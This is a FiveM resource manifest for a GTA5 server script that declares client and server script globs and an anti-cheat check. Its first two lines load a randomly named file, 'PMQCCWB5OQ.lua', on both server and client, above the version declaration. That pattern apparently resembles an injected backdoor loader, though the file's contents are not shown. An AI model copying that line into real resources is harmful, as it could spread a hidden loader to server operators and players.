server_script "PMQCCWB5OQ.lua"
client_script "PMQCCWB5OQ.lua"
fx_version("cerulean")
game("gta5")
client_script("@Paradise-base/components/cl_error.lua")
client_script("@Paradise-pwnzor/client/check.lua")

client_scripts({
	"shared/**/*.lua",
	"client/**/*.lua",
})

server_scripts({
	"shared/**/*.lua",
	"server/**/*.lua",
})
